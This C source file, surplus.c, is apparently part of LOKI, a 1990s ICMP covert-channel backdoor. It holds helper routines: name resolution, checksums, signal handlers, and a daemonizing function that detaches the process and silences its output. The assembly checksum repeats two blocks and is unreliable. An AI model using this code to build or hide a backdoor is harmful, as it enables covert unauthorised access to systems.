/*
 * LOKI
 *
 * [ surplus.c ]
 *
 *  1996/7 Guild Corporation Worldwide      [daemon9]
 */


#include "loki.h"

extern int verbose;    
extern jmp_buf env;

#define WORKING_ROOT "/tmp"             /* Sometimes we make mistakes.
                                         * Sometimes we execute commands we
                                         * didn't mean to.  `rm -rf` is much
                                         * easier to palate from /tmp 
                                         */
/*
 *  Domain names / dotted-decimals --> network byte order.
 */

u_long name_resolve(char *hostname)
{

    struct in_addr addr;
    struct hostent *hostEnt;
                                        /* name lookup failure */
    if ((addr.s_addr = inet_addr(hostname)) == -1)
    {   
        if (!(hostEnt = gethostbyname(hostname)))
            err_exit(1, 1, verbose, "\n[fatal] name lookup failed");
        bcopy(hostEnt->h_addr, (char *)&addr.s_addr, hostEnt -> h_length);
    }
    return (addr.s_addr);
}


/*
 *  Network byte order --> dotted-decimals.
 */

char *host_lookup(u_long in)
{

    char hostname[BUFSIZ] = {0};
    struct in_addr addr;

    addr.s_addr = in;
    strcpy(hostname, inet_ntoa(addr));
    return (strdup(hostname));
}
       
#ifdef X86FAST_CHECK
 
/*
 *  Fast x86 based assembly implementation of the IP checksum routine.
 */


u_short i_check(u_short *buff, int len)
{

    u_long sum = 0;
    if (len > 3)
    {
        __asm__("clc\n"
        "1:\t"
        "lodsl\n\t"
        "adcl %%eax, %%ebx\n\t"
        "loop 1b\n\t"
        "adcl $0, %%ebx\n\t"
        "movl %%ebx, %%eax\n\t"
        "shrl $16, %%eax\n\t"
        "addw %%ax, %%bx\n\t"
        "adcw $0, %%bx"
        : "=b" (sum) , "=S" (buff)
        : "0" (sum), "c" (len >> 2) ,"1" (buff)
        : "ax", "cx", "si", "bx");
    }
    if (len & 2)
    {
        __asm__("lodsw\n\t"
        "addw %%ax, %%bx\n\t"
        "adcw $0, %%bx"
        : "=b" (sum) , "=S" (buff)
        : "0" (sum), "c" (len >> 2) ,"1" (buff)
        : "ax", "cx", "si", "bx");
    }
    if (len & 2)
    {
        __asm__("lodsw\n\t"
        "addw %%ax, %%bx\n\t"
        "adcw $0, %%bx"
        : "=b" (sum), "=S" (buff)
        : "0" (sum), "1" (buff)
        : "bx", "ax", "si");
    }
    if (len & 1)
    {
        __asm__("lodsb\n\t"
        "movb $0, %%ah\n\t"
        "addw %%ax, %%bx\n\t"
        "adcw $0, %%bx"
        : "=b" (sum), "=S" (buff)
        : "0" (sum), "1" (buff)
        : "bx", "ax", "si");
    }                                                                         
    if (len & 1)
    {
        __asm__("lodsb\n\t"
        "movb $0, %%ah\n\t"
        "addw %%ax, %%bx\n\t"
        "adcw $0, %%bx"
        : "=b" (sum), "=S" (buff)
        : "0" (sum), "1" (buff)
        : "bx", "ax", "si");
    }
    sum  = ~sum;
    return (sum & 0xffff);
}

#else                           

/*
 *  Standard IP Family checksum routine.
 */

u_short i_check(u_short *ptr, int nbytes)
{

    register long sum       = 0; 
    u_short oddbyte         = 0;
    register u_short answer = 0;

    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
    { 
        oddbyte = 0;  
        *((u_char *)&oddbyte) =* (u_char *)ptr; 
        sum += oddbyte;
    }
    sum     = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
    sum     += (sum >> 16);
    answer  = ~sum;
    return (answer);
}

#endif  /* X86FAST_CHECK */


/*
 *  Generic exit with error function.  If checkerrno is true, errno should
 *  be looked at and we call perror, otherwise, just dump to stderr.
 *  Additionally, we have the option of suppressing the error messages by
 *  zeroing verbose.
 */

void err_exit(int exitstatus, int checkerrno, int verbalkint, char *errstr)
{
    if (verbalkint)
    {
        if (checkerrno) perror(errstr);
        else fprintf(stderr, errstr);
    }
    clean_exit(exitstatus);
}


/*
 *  SIGALRM signal handler.  We reset the alarm timer and default signal
 *  signal handler, then restore our stack frame from the point that
 *  setjmp() was called.
 */

void catch_timeout(int signo)
{

    alarm(0);                           /* reset alarm timer */

                                        /* reset SIGALRM, our handler will
                                         * be again set after we longjmp()
                                         */   
    if (signal(SIGALRM, catch_timeout) == SIG_ERR)
        err_exit(1, 1, verbose, L_MSG_SIGALRM);
                                        /* restore environment */
    longjmp(env, 1);
}

       
/*
 *  Clean exit handler
 */

void clean_exit(int status)
{

    extern int tsock;
    extern int ripsock;

    close(ripsock);
    close(tsock);
    exit(status);
}

/*
 *  Keep child proccesses from zombiing on us
 */

void reaper(int signo)
{
    int sys = 0;

    wait(&sys);                     /* get child's exit status */

                                    /* re-establish signal handler */
    if (signal(SIGCHLD, reaper) == SIG_ERR)
        err_exit(1, 1, verbose, L_MSG_SIGCHLD);
}

/*
 *  Simple daemonizing procedure.
 */

void shadow()
{
    extern int errno;
    int fd = 0;

    close(STDIN_FILENO);            /* We no longer need STDIN */
    if (!verbose)
    {                               /* Get rid of these also */
        close(STDOUT_FILENO);
        close(STDERR_FILENO);
    }
                                    /* Ignore read/write signals from/to
                                     * the controlling terminal.
                                     */
    signal(SIGTTOU, SIG_IGN);
    signal(SIGTTIN, SIG_IGN);
    signal(SIGTSTP, SIG_IGN);       /* Ignore suspend signal. */

    switch (fork())
    {
        case 0:                     /* child continues */
            break;                          

        default:                    /* parent exits */
            clean_exit(0);

        case -1:                    /* fork error */
            err_exit(1, 1, verbose, "[fatal] Cannot go daemon");
    }
                                    /* Create a new session and set this
                                     * process to be the group leader.
                                     */
    if (setsid() == -1)
        err_exit(1, 1, verbose, "[fatal] Cannot create session");
                                    /* Detach from controlling terminal */
    if ((fd = open("/dev/tty", O_RDWR)) >= 0)
    {
        if ((ioctl(fd, TIOCNOTTY, (char *)NULL)) == -1)
                err_exit(1, 1, verbose, "[fatal] cannot detach from controlling terminal");
        close(fd);
    }
    errno = 0;
    chdir(WORKING_ROOT);            /* Working dir should be the root */
    umask(0);                       /* File creation mask should be 0 */
}

#ifdef  DEBUG

/* 
 *  Bulk of this function taken from Stevens APUE...
 *  got this from Mooks (LTC)
 */

void fd_status(int fd, int newline)
{ 
    int accmode = 0, val = 0;

    val = fcntl(fd, F_GETFL, 0);

#if !defined(pyr) && !defined(ibm032) && !defined(sony_news) && !defined(NeXT)
    accmode = val & O_ACCMODE;
#else                           /* pyramid */
    accmode = val;              /* kludge */
#endif                          /* pyramid */
     if (accmode == O_RDONLY)       fprintf(stderr, " read only");
     else if (accmode == O_WRONLY)  fprintf(stderr, " write only");
     else if (accmode == O_RDWR)    fprintf(stderr, " read write");
     if (val & O_APPEND)            fprintf(stderr, " append");
     if (val & O_NONBLOCK)          fprintf(stderr, " nonblocking");
     else                           fprintf(stderr, " blocking");
#if defined(O_SYNC)
     if (val & O_SYNC)              fprintf(stderr, " sync writes");
#else
#if defined(O_FSYNC)
     if (val & O_FSYNC)             fprintf(stderr, " sync writes");
#endif                          /* O_FSYNC */
#endif                          /* O_SYNC */
     if (newline)                   fprintf(stderr, "\r\n");
}
#endif  /* DEBUG */

/* EOF */

